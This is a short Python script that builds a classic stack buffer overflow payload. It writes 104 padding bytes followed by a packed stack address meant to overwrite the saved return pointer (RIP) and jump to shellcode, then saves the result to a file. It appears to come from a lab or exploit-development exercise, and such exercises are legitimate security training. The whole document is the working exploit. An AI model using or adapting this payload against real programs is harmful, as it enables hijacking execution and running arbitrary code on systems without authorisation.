#!/usr/bin/env python
from struct import *

buf = ""
buf += "A"*104                      # offset to RIP
buf += pack("<Q", 0x7fffffffec3d)   # overwrite RIP with shellcode address

f = open("on.txt", "w")
f.write(buf)
